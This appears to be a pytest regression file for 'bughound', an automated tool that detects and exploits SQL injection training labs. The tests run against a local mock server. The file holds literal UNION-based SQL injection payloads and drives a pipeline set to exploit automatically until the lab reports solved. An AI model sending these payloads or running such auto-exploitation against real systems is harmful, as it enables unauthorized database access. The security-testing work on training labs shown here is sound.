"""Regression tests for the 1.2.0 hint-driven UNION objective (1.2.0).

The reported failing lab -- "SQL injection UNION attack, finding a column
containing text" -- is NOT a credential objective. Its banner hint states
the objective verbatim:

    Make the database retrieve the string: 'kNwvPL'

and the platform flips to solved the moment that string comes back through
the vulnerable query. The pre-1.2.0 ladder only knew the credential path
(extract users -> log in as administrator), which can NEVER complete this
lab family: it burned its UNION extraction plus a 4-minute boolean-blind
fallback and reported "attempted" -- the "it still doesn't exploit the
link" failure report.

The fix has two halves, both covered here:

* ``solving.detect_lab_html`` parses the banner's hint paragraph, and the
  objective engine gains a ``sqli-union-hint-objective`` strategy that
  reads the hint, discovers the UNION shape (marker-validated), and fires
  the objective string through a text column.
* the mock in ``mock_academy.build_union_text_lab`` reproduces the live
  lab's exact quirks (numeric/text/numeric column typing -- strings are
  only legal in the MIDDLE UNION position, unquoted payloads stay valid
  literals, no category echo), so passing these tests means the chain
  crawl -> detect -> ladder -> strategy -> solved works end to end.
"""

from __future__ import annotations

import asyncio
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(__file__))

from mock_academy import (  # noqa: E402
    UNION_TEXT_TITLE,
    build_union_text_lab,
    lab_server,
)

from bughound.authorization import Scope  # noqa: E402
from bughound.engine import run_scan  # noqa: E402
from bughound.models import ScanConfig  # noqa: E402
from bughound.objectives import build_ladder, extract_hint_target  # noqa: E402
from bughound.solving import detect_lab_html  # noqa: E402

BANNER_HTML = """
<html><head><title>SQL injection UNION attack, finding a column containing
text</title></head><body>
<div id="academyLabHeader"><section class="academyLabBanner">
<div class="title-container">
<h2>SQL injection UNION attack, finding a column containing text</h2>
<p id="hint">Make the database retrieve the string: 'kNwvPL'</p>
</div>
<div class='widgetcontainer-lab-status is-notsolved'><p>Not solved</p></div>
</section></div></body></html>
"""


# ---------------------------------------------------------------------------
# Unit: hint parsing and objective extraction
# ---------------------------------------------------------------------------


def test_banner_hint_is_parsed_into_lab_dict():
    lab = detect_lab_html(BANNER_HTML)
    assert lab is not None
    assert lab["solved"] is False
    assert lab["hint"] == "Make the database retrieve the string: 'kNwvPL'"


def test_extract_hint_target_prefers_platform_phrasing():
    assert extract_hint_target("Make the database retrieve the string: 'kNwvPL'") == "kNwvPL"
    assert extract_hint_target("make the database retrieve the string 'AB12CD'") == "AB12CD"


def test_extract_hint_target_falls_back_to_quoted_token():
    assert extract_hint_target("Display the value 'xy789z' somewhere") == "xy789z"


def test_extract_hint_target_empty_without_hint():
    assert extract_hint_target("") == ""
    assert extract_hint_target("no quoted value here") == ""


def test_labs_without_hint_still_parse():
    html = (
        "<html><body><div id=academyLabHeader>"
        "<div class=title-container><h2>2FA simple bypass</h2></div>"
        "<div class='widgetcontainer-lab-status is-notsolved'><p>Not solved</p></div>"
        "</div></body></html>"
    )
    lab = detect_lab_html(html)
    assert lab is not None and "hint" not in lab


def test_ladder_prefers_hint_strategy_for_union_titles():
    class _R:
        sorted_findings = []

    ladder = [s.name for s in build_ladder(UNION_TEXT_TITLE, _R())]
    assert ladder[0] == "sqli-union-hint-objective"
    # the credential strategy still follows as fallback
    assert "sqli-extraction-login" in ladder


def test_ladder_keeps_credential_first_for_non_union_sqli_titles():
    class _R:
        sorted_findings = []

    ladder = [s.name for s in build_ladder(
        "SQL injection attack, listing the database contents on Oracle", _R())]
    assert ladder[0] == "sqli-extraction-login"


# ---------------------------------------------------------------------------
# Integration: the FULL pipeline must take the mock from Not solved to Solved
# ---------------------------------------------------------------------------


def _config(base: str) -> ScanConfig:
    return ScanConfig(
        target_url=base,
        aggressive=True,
        exploit=True,
        use_external_tools=False,
        max_urls=20,
        max_depth=2,
        timeout=15,
        solve_budget=260,
    )


def _scope() -> Scope:
    return Scope(allowed_hosts=["127.0.0.1"], note="e2e mock lab")


@pytest.fixture()
def union_text_lab():
    app, state, target = build_union_text_lab()
    with lab_server(app) as base:
        yield base, state, target


def test_mock_fidelity_column_typing_and_literal_trap(union_text_lab):
    """Guard: if the mock stops mirroring the live lab, these fail first."""
    import httpx

    base, state, target = union_text_lab
    with httpx.Client(base_url=base, timeout=10) as c:
        # strings are legal ONLY in the middle UNION position
        assert c.get("/filter", params={"category": "Accessories' UNION SELECT 'a','b','c'-- -"}).status_code == 500
        assert c.get("/filter", params={"category": "Accessories' UNION SELECT 'a',NULL,NULL-- -"}).status_code == 500
        ok = c.get("/filter", params={"category": "Accessories' UNION SELECT NULL,'mx',NULL-- -"})
        assert ok.status_code == 200 and "mx" in ok.text
        # unquoted payload: valid literal, NO union row (the v1.1.1 trap)
        trap = c.get("/filter", params={"category": "Accessories UNION SELECT NULL,NULL,NULL-- -"})
        assert trap.status_code == 200 and "NULL" not in trap.text
        # the category VALUE is not echoed (probe markers cannot self-reflect
        # -- nav-link labels exist, but an arbitrary value never comes back)
        probe = "NoEchoZq7"
        plain = c.get("/filter", params={"category": probe})
        assert probe not in plain.text


def test_full_pipeline_solves_hint_string_lab(union_text_lab):
    base, state, target = union_text_lab
    assert state.solved is False
    result = asyncio.run(run_scan(_config(base), _scope(), confirmed=True, progress=lambda m: None))

    # The platform's own oracle must have flipped.
    assert state.solved is True, "mock lab banner never flipped to solved"
    assert result.objective.get("solved_after") is True
    assert result.objective.get("title") == UNION_TEXT_TITLE
    attempts = result.objective.get("attempts", [])
    assert attempts, "solve phase recorded no attempts"
    first = attempts[0]
    assert first["strategy"] == "sqli-union-hint-objective"
    assert first["lab_solved"] is True
    assert target in first["finding"]  # the objective string is in the evidence
    # and the report carries the solved banner as evidence
    assert "is-solved" in str(result.objective.get("evidence", ""))


def test_strategy_falls_back_to_crawled_get_targets(union_text_lab):
    """Detection miss must not strand a UNION lab: with NO SQLi findings the
    strategy still drives the hint objective through the crawled GET target."""
    base, state, target = union_text_lab
    from bughound.http_client import HttpClient
    from bughound.models import ScanConfig as Cfg
    from bughound.models import Target as T
    from bughound.modules.base import RequestTarget, ScanContext
    from bughound.objectives import SolveBudget, strategy_sqli_union_hint

    client = HttpClient(timeout=10)
    cfg = Cfg(target_url=base, aggressive=True, use_external_tools=False)
    tgt = T(url=base, scheme="http", host="127.0.0.1", port=int(base.split(":")[2]))
    rt = RequestTarget(
        url=base.rstrip("/") + "/filter", method="GET", params={"category": "Accessories"},
        source="query",
    )
    seed = (
        "<html><body><div id=\"academyLabHeader\">"
        "<div class=title-container><h2>" + UNION_TEXT_TITLE + "</h2>"
        "<p id=\"hint\">Make the database retrieve the string: '" + target + "'</p></div>"
        "<div class='widgetcontainer-lab-status is-notsolved'><p>Not solved</p></div>"
        "</div></body></html>"
    )
    ctx = ScanContext(
        client=client, config=cfg, target=tgt, base_url=base, urls=[base],
        request_targets=[rt], seed_html=seed,
    )

    class _R:
        sorted_findings = []  # NO SQLi finding: the fallback must engage

    async def run():
        try:
            budget = SolveBudget(max_requests=120)
            note = await strategy_sqli_union_hint(ctx, _R(), lambda m: None, budget)
            assert target in note, f"fallback did not retrieve the hint string: {note}"
            assert state.solved is True, "mock oracle never flipped via fallback"
        finally:
            await client.aclose()

    asyncio.run(run())
